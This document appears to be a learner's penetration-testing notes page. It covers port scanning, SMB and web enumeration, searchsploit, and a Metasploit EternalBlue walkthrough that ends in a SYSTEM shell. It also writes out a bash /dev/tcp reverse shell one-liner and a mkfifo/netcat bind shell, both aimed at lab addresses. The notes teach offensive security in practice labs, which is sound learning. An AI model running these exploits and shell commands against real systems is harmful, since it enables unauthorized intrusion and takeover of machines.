# ⚙ Practical

Useful commands to get started

## <mark style="color:blue;">Working with ports and services</mark>

*   <mark style="color:yellow;">**netcat**</mark> : Command used for interacting with TCP/UDP ports.

    Connecting to shells\
    Connect to any listening port and interact with the service running on that port

    **netcat** 10.10.10.10 22 : Helps identify what service is running on a particular port while showing the version etc... This is called Banner grabbing

    **nc** -nv 10.129.42.253 21 : The nc command is the short way of netcat and here we are saying to output the version of the running service
*   <mark style="color:yellow;">**nmap**</mark>\*\* :\*\* Used for scanning ports

    **nmap** 10.126.10.10 : Will show us all available ports or open ports on this web server

    The state can have a value of 'filtered' which means that the firewall only accept specific IPs

    By default, this command only show TCP ports.

    **nmap** -sV -sC -p- 10.129.42.253 : The -sV to perform a version scan, -sC to get more info and -p- to scan all 65 535 ports

    The -sC parameter run by default some useful scripts, but we can run specific scripts :

    **nmap** --script \<script name> -p\<port> \<host>
*   <mark style="color:yellow;">**ftp**</mark>\*\* :\*\*

    **ftp** -p 10.129.42.253 : So here we connected to the service using ftp.
*   <mark style="color:yellow;">**smb**</mark>\*\* :\*\* Used by windows for sharing files (Allows users and admins to share folders and make them accessible remotely by other users.

    **nmap** --script smb-os-discovery.nse -p445 10.10.10.40 : So here we used a specific script to interact with smb and get the OS version.

    \*\*smbclient -\*\*N -L \\\\\\\10.129.42.15 : The smbclient can interact with smb shares. The -N supresses the password promt and the -L lists for us the available shares on remote host.

    \*\*smbclient -\*\*U bob \\\\\\\10.129.42.15\\\users : The -U means user so here we are trying to log in as the user bob so he will demand password and after that we can do ls for example and access different files etc...

    When connected to the client with SMB, can we use commands like cd to get into a directory and get command if we want to see the contents of a file...
*   <mark style="color:yellow;">**snmp**</mark>\*\* :\*\* Interacts with different equipments

    **snmpwalk** -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0

## <mark style="color:blue;">Expanding the terminal</mark>

* <mark style="color:yellow;">**tmux**</mark>\*\* :\*\* Can exapnd the terminal for example put 2 windows next to each other in one terminal. The default key to enter tmux commands is Ctrl+B

## <mark style="color:blue;">Web enumeration</mark>

*   <mark style="color:yellow;">**gobuster**</mark> dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt : gobuster is a tool that performs directory enumeration and let us check if we can uncover any hidden files or directories on the webserver that are not intended for public access. So gobuster let us do directory brute-forcing. Here, we run a simple scan using the dirb common.txt wordlist. There also may be essential resources hosted on subdomains, such as admin panels or applications with additional functionality that could be exploited. We can use `GoBuster` to enumerate available subdomains of a given domain using the `dns` flag to specify DNS mode.

    **gobuster** dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt : Here we are targeting the domain 'inlanefreight.com'. The scan below reveals several interesting subdomains that we could examine further

```shell-session
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Domain:     inlanefreight.com
[+] Threads:    10
[+] Timeout:    1s
[+] Wordlist:   /usr/share/SecLists/Discovery/DNS/namelist.txt
===============================================================
2020/12/17 23:08:55 Starting gobuster
===============================================================
Found: blog.inlanefreight.com
Found: customer.inlanefreight.com
Found: my.inlanefreight.com
Found: ns1.inlanefreight.com
Found: ns2.inlanefreight.com
Found: ns3.inlanefreight.com
===============================================================
2020/12/17 23:10:34 Finished
===============================================================
```

* <mark style="color:yellow;">**curl**</mark> : We can use curl to retrieve server header information from the command line

```shell-session
curl -IL https://www.inlanefreight.com

HTTP/1.1 200 OK
Date: Fri, 18 Dec 2020 22:24:05 GMT
Server: Apache/2.4.29 (Ubuntu)
Link: <https://www.inlanefreight.com/index.php/wp-json/>; rel="https://api.w.org/"
Link: <https://www.inlanefreight.com/>; rel=shortlink
Content-Type: text/html; charset=UTF-8
```

* <mark style="color:yellow;">**whatweb**</mark> : We can extract the version of web servers, supporting frameworks, and applications

```shell-session
whatweb 10.10.10.121

http://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[license@php.net], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.121], Title[PHP 7.4.3 - phpinfo()]
```

## <mark style="color:blue;">Certificates</mark>

SSL/TLS certificates are another potentially valuable source of information if HTTPS is in use

* Robots.txt : The robots.txt file can provide valuable information such as the location of private files and admin pages. In this case, we see that the robots.txt file contains two disallowed entries.

## <mark style="color:blue;">Public Exploits</mark>

Once we identify the services running on ports identified from our Nmap scan, the first step is to look if any of the applications/services have any public exploits. Public exploits can be found for web applications and other applications running on open ports, like SSH or ftp.

We can search for exploits of an application by using a tool called **searchsploit.** Before that we must install the **exploitdb** using the command :&#x20;

* sudo apt install **exploitdb -y**
* **searchsploit** openssh 7.2&#x20;

```shell-session
Exploit Title                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                     | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                               | linux/remote/45210.py
OpenSSH 7.2 - Denial of Service                                                                                              | linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                                      | multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeration                                                                                         | linux/remote/40136.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                         | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                     | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                         | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                 
```

## <mark style="color:blue;">Metasploit primer</mark>

It's an excellent tool for pentesters. It contains many built-in exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets

* **msfconsole :** To run Metasploit, we can use the msfconsole command. Once we have metasploit running, we can search for our target application with the search exploit command. For example, we can search for the SMB vulnerability we identified previously

```shell-session
msf6 > search exploit eternalblue

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
<SNIP>
EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010
```

We found one exploit for this service. We can use it by copying the full name of it and using use to use it.

```shell-session
msf6 > use exploit/windows/smb/ms17_010_psexec

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

Before we can run the exploit, we need to configure its options. To view the options available to configure, we can use the show options command:

```shell-session
Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                                                 Required  Description
   ----                  ---------------                                                 --------  -----------
   DBGTRACE              false                                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                                yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445                                                             yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                  no        The service display name
   SERVICE_NAME                                                                          no        The service name
   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                               no        The password for the specified username
   SMBUser                                                                               no        The username to authenticate as

...SNIP...
```

Any option with `Required` set to `yes` needs to be set for the exploit to work. In this case, we only have options to set: `RHOSTS`, which means the IP of our target (this can be one IP, multiple IPs, or a file containing a list of IPs). We can set them with the `set` command:

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
LHOST => tun0
```

Once we have both options set, we can start the exploitation. However, before we run the script, we can run a check to ensure the server is vulnerable:

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > check

[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
```

As we can see, the server is indeed vulnerable. Note that not every exploit in the `Metasploit Framework` supports the `check` function. Finally, we can use the `run` or `exploit` command to run the exploit:

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[*] 10.10.10.40:445 - Built a write-what-where primitive...
[+] 10.10.10.40:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.10.10.40:445 - Selecting PowerShell target
[*] 10.10.10.40:445 - Executing the payload...
[+] 10.10.10.40:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.40:49159) at 2020-12-27 01:13:28 +0000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 39640 created.
Channel 0 created.
Windows 7 Professional 7601 Service Pack 1
(C) Copyright 1985-2009 Microsoft Corp.

C:\WINDOWS\system32>whoami
NT AUTHORITY\SYSTEM
```

As we can see, we have been able to gain admin access to the box and used the `shell` command to drop us into an interactive shell. These are basic examples of using `Metasploit` to exploit a vulnerability on a remote server. There are many retired boxes on the Hack The Box platform that are great for practicing Metasploit

## <mark style="color:blue;">Shells</mark>

Once we compromise a system and exploit a vulnerability to execute commands on the compromised hosts remotely, we usually need a method of communicating with the system not to have to keep exploiting the same vulnerability to execute each command. To enumerate the system or take further control over it or within its network, we need a reliable connection that gives us direct access to the system's shell, i.e., `Bash` or `PowerShell.`

There are 3 types of shells :&#x20;

* Reverse Shell : Connects back to our system and gives us control through a reverse connection.
* Bind Shell : Waits for us to connect to it and gives us control once we do.
* Web Shell : Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output

## <mark style="color:blue;">Reverse shell</mark> &#x20;

It is the most common way. Once we identify a vulnerability on the remote host that allows remote code execution, we can start a `netcat` listener on our machine that listens on a specific port, say port `1234`. With this listener in place, we can execute a `reverse shell command` that connects the remote systems shell, i.e., `Bash` or `PowerShell` to our `netcat` listener, which gives us a reverse connection over the remote system.

*   The first step is to start a `netcat` listener on a port of our choosing:&#x20;

    ```shell-session
    nc -lvnp 1234

    listening on [any] 1234 ...
    ```

The -l means listen mode so to wait for a connection to connect to us. The -v is for verbose. The -n disbable DNS resolution and only connect from/to IPs, to speed up the connection, and the -p is the port number `netcat` is listening on, and the reverse connection should be sent to.&#x20;

However, first, we need to find our system's IP to send a reverse connection back to us. We can find our IP with the command : ip address

The command we execute depends on what operating system the compromised host runs on, i.e., Linux or Windows, and what applications and commands we can access

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

We can utilize the exploit we have over the remote host to execute one of the above commands, i.e., through a Python exploit or a Metasploit module, to get a reverse connection. Once we do, we should receive a connection in our `netcat` listener:

```shell-session
nc -lvnp 1234

listening on [any] 1234 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

As we can see, after we received a connection on our `netcat` listener, we were able to type our command and directly get its output back, right in our machine.

A `Reverse Shell` is handy when we want to get a quick, reliable connection to our compromised host. However, a `Reverse Shell` can be very fragile. Once the reverse shell command is stopped, or if we lose our connection for any reason, we would have to use the initial exploit to execute the reverse shell command again to regain our access.

## <mark style="color:blue;">Bind shell</mark> &#x20;

Unlike a `Reverse Shell` that connects to us, we will have to connect to it on the `targets'` listening port. Once we execute a `Bind Shell Command`, it will start listening on a port on the remote host and bind that host's shell, i.e., `Bash` or `PowerShell`'to that port. We have to connect to that port with `netcat`, and we will get control through a shell on that system.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

Once we execute the bind shell command, we should have a shell waiting for us on the specified port. We can now connect to it.We can use `netcat` to connect to that port and get a connection to the shell:

```shell-session
nc 10.10.10.1 1234

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

&#x20;&#x20;
